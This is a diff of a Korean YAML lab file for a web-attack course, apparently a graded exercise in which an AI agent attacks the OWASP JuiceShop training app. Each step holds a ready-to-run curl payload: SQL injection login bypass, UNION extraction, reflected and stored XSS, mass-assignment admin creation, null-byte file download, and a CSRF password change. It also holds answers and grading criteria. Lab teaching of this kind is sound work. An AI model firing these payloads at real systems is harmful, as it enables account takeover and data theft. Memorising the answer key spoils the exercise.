@@ -3,8 +3,8 @@ title: 웹 애플리케이션 공격 (Web App Attacks) (AI 지원)
 version: ai
 course: attack-ai
 week: 4
-description: SQL Injection, XSS, Command Injection 등 주요 웹 공격 기법을 JuiceShop 환경에서 실습한다.
-  OWASP Top 10 취약점을 직접 공략하고, 공격 원리와 대응 방안을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: SQL Injection, XSS, Command Injection 등 주요 웹 공격 기법을 JuiceShop 환경에서 실습한다. OWASP Top 10 취약점을
+  직접 공략하고, 공격 원리와 대응 방안을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -14,172 +14,270 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '
-    OR 1=1-- 페이로드를 사용하여 관리자로 로그인하라.
+  instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 ' OR 1=1-- 페이로드를 사용하여
+    관리자로 로그인하라.
   hint: POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다
   category: exploit
   points: 10
-  answer: "\U0001F916 프롬프트: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라.\
-    \ email에 ' OR 1=1-- 페이로드를 사용하여 관리자로 로그인해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST\
-    \ http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
-  answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로
-    이후 조건을 무시시킨다. DB의 첫 번째 사용자(보통 admin)로 로그인된다.'
+  answer: "\U0001F916 프롬프트: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 ' OR 1=1--\
+    \ 페이로드를 사용하여 관리자로 로그인해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80:3000/rest/user/login\
+    \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"\
+    }' \\\n | python3 -m json.tool"
+  answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로 이후 조건을 무시시킨다. DB의 첫
+    번째 사용자(보통 admin)로 로그인된다.'
   verify:
     type: output_contains
     expect: token
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
-    \n | python3 -m json.tool"
+  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
   risk_level: medium
-  bastion_prompt: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에
-    ' OR 1=1-- 페이로드를 사용하여 관리자로 로그인해줘
+  bastion_prompt: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 ' OR 1=1-- 페이로드를 사용하여
+    관리자로 로그인해줘
 - order: 2
   instruction: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인하라.
   hint: JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다
   category: analysis
   points: 10
-  answer: "\U0001F916 프롬프트: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
-    \n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
+  answer: "\U0001F916 프롬프트: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST\
+    \ http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"\
+    email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
     \ p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
-  answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64
-    디코딩하면 사용자 ID, 이메일, 역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
+  answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64 디코딩하면 사용자 ID, 이메일,
+    역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
   verify:
     type: output_contains
     expect: email
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
-    \n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
-    \ p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
+  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -c \"import sys,json,base64;\
+    \ t=json.load(sys.stdin)['authentication']['token']; p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
   risk_level: low
   bastion_prompt: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘
 - order: 3
-  instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
-    src='javascript:alert(1)'> 페이로드를 사용하라.
+  instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src='javascript:alert(1)'>
+    페이로드를 사용하라.
   hint: 검색 쿼리에 HTML/JavaScript 코드를 삽입한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
-    src=''javascript:alert(1)''> 페이로드를 사용해줘
+  answer: '🤖 프롬프트: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src=''javascript:alert(1)''>
+    페이로드를 사용해줘
 
     📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'''
-  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. 공격자는 악성 스크립트가 포함된 URL을
-    피해자에게 전달하여 세션 탈취, 피싱 등을 수행할 수 있다.
+  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. 공격자는 악성 스크립트가 포함된 URL을 피해자에게 전달하여 세션 탈취,
+    피싱 등을 수행할 수 있다.
   verify:
     type: output_contains
     expect: iframe
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
   risk_level: medium
-  bastion_prompt: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
-    src='javascript:alert(1)'> 페이로드를 사용해줘
+  bastion_prompt: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src='javascript:alert(1)'>
+    페이로드를 사용해줘
 - order: 4
-  instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라.
-    Mass Assignment 취약점을 공략하라.
+  instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment 취약점을
+    공략하라.
   hint: 등록 요청에 role 필드를 추가하여 전송하라
   category: exploit
   points: 10
-  answer: "\U0001F916 프롬프트: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로\
-    \ 설정한 사용자를 등록하라. Mass Assignment 취약점을 공략해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST\
-    \ http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\"\
-    :\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\"\
-    :\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m json.tool"
-  answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접
-    지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
+  answer: "\U0001F916 프롬프트: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass\
+    \ Assignment 취약점을 공략해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80:3000/api/Users \\\n\
+    \  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\"\
+    ,\"passwordRepeat\":\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\":\"\
+    test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m json.tool"
+  answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접 지정하여 관리자 권한의 계정을 생성할
+    수 있다. OWASP A01(Broken Access Control)에 해당한다.
   verify:
     type: output_contains
     expect: email
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\"\
-    ,\"passwordRepeat\":\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"\
-    id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m\
-    \ json.tool"
+  script: "curl -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\":\"hacker123\"\
+    ,\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\"\
+    }' \\\n | python3 -m json.tool"
   risk_level: medium
-  bastion_prompt: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라.
-    Mass Assignment 취약점을 공략해줘
+  bastion_prompt: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment
+    취약점을 공략해줘
 - order: 5
-  instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
-    시도하여 데이터베이스 테이블 정보를 추출하라.
+  instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스 테이블 정보를
+    추출하라.
   hint: UNION SELECT와 sqlite_master를 활용하라
   category: exploit
   points: 15
-  answer: '🤖 프롬프트: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
-    시도하여 데이터베이스 테이블 정보를 추출해줘
+  answer: '🤖 프롬프트: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스 테이블
+    정보를 추출해줘
 
     📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'''
-  answer_detail: UNION 기반 SQLi는 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 출력하는 기법이다.
-    sqlite_master(SQLite) 또는 information_schema(MySQL)에서 테이블 구조를 조회할 수 있다.
+  answer_detail: UNION 기반 SQLi는 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 출력하는 기법이다. sqlite_master(SQLite)
+    또는 information_schema(MySQL)에서 테이블 구조를 조회할 수 있다.
   verify:
     type: output_contains
     expect: SELECT
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
   risk_level: medium
-  bastion_prompt: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
-    시도하여 데이터베이스 테이블 정보를 추출해줘
+  bastion_prompt: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스 테이블 정보를
+    추출해줘
 - order: 6
-  instruction: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에
-    <script>alert('XSS')</script>를 포함하라.
+  instruction: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에 <script>alert('XSS')</script>를
+    포함하라.
   hint: POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment
-    필드에 <script>alert(''XSS'')</script>를 포함해줘
+  answer: '🤖 프롬프트: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에 <script>alert(''XSS'')</script>를
+    포함해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
-    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}''
-    | python3 -m json.tool'
-  answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 다른 사용자가 해당 페이지를 볼 때 실행된다. Reflected
-    XSS보다 위험하며, 관리자 페이지에서 실행되면 관리자 세션을 탈취할 수 있다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H
+    "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}'' | python3
+    -m json.tool'
+  answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 다른 사용자가 해당 페이지를 볼 때 실행된다. Reflected XSS보다 위험하며, 관리자 페이지에서
+    실행되면 관리자 세션을 탈취할 수 있다.
   verify:
     type: output_contains
     expect: comment
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
-    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}''
-    | python3 -m json.tool'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H
+    "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}'' | python3
+    -m json.tool'
   risk_level: medium
-  bastion_prompt: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment
-    필드에 <script>alert('XSS')</script>를 포함해줘
+  bastion_prompt: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에 <script>alert('XSS')</script>를
+    포함해줘
 - order: 7
-  instruction: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라.
-    package.json.bak 파일을 시도하라.
+  instruction: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라. package.json.bak 파일을
+    시도하라.
   hint: URL에 %2500(이중 인코딩된 Null Byte)을 사용하라
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라.
-    package.json.bak 파일을 시도해줘
+  answer: '🤖 프롬프트: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라. package.json.bak
+    파일을 시도해줘
 
     📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'''
-  answer_detail: Null Byte Injection(%00)은 파일 확장자 검증을 우회하는 기법이다. 서버가 .md 파일만 허용할 때
-    filename.bak%00.md로 요청하면 확장자 검증은 .md로 통과하지만 실제로는 .bak 파일이 반환된다.
+  answer_detail: Null Byte Injection(%00)은 파일 확장자 검증을 우회하는 기법이다. 서버가 .md 파일만 허용할 때 filename.bak%00.md로
+    요청하면 확장자 검증은 .md로 통과하지만 실제로는 .bak 파일이 반환된다.
   verify:
     type: output_contains
     expect: name
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md'
   risk_level: medium
-  bastion_prompt: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라.
-    package.json.bak 파일을 시도해줘
+  bastion_prompt: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라. package.json.bak
+    파일을 시도해줘
 - order: 8
   instruction: JuiceShop에서 0-star 리뷰를 제출하라. rating 값을 0으로 설정하여 입력 검증 우회를 시도하라.
   hint: API 직접 호출로 클라이언트 측 검증을 우회한다
@@ -187,39 +285,49 @@ steps:
   points: 10
   answer: '🤖 프롬프트: JuiceShop에서 0-star 리뷰를 제출하라. rating 값을 0으로 설정하여 입력 검증 우회를 시도해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
-    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' |
-    python3 -m json.tool'
-  answer_detail: 클라이언트 측 입력 검증(HTML5 min/max, JavaScript validation)은 API를 직접 호출하면
-    우회할 수 있다. 서버 측에서도 반드시 검증을 수행해야 한다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H
+    "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' | python3 -m json.tool'
+  answer_detail: 클라이언트 측 입력 검증(HTML5 min/max, JavaScript validation)은 API를 직접 호출하면 우회할 수 있다. 서버 측에서도 반드시
+    검증을 수행해야 한다.
   verify:
     type: output_contains
     expect: rating
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
-    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' |
-    python3 -m json.tool'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H
+    "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' | python3 -m json.tool'
   risk_level: medium
   bastion_prompt: JuiceShop에서 0-star 리뷰를 제출하라. rating 값을 0으로 설정하여 입력 검증 우회를 시도해줘
 - order: 9
-  instruction: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로
-    비밀번호를 변경할 수 있는지 테스트하라.
+  instruction: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로 비밀번호를 변경할 수 있는지
+    테스트하라.
   hint: GET 파라미터로 current, new, repeat을 전달한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET
-    요청으로 비밀번호를 변경할 수 있는지 테스트해줘
+  answer: '🤖 프롬프트: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로 비밀번호를 변경할 수
+    있는지 테스트해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123''
     -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
   answer_detail: GET 요청으로 비밀번호 변경이 가능하면 CSRF 공격에 매우 취약하다. 공격자가 악성 이미지 태그(<img src=.../change-password?...>)를
@@ -228,43 +336,66 @@ steps:
     type: output_contains
     expect: password
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
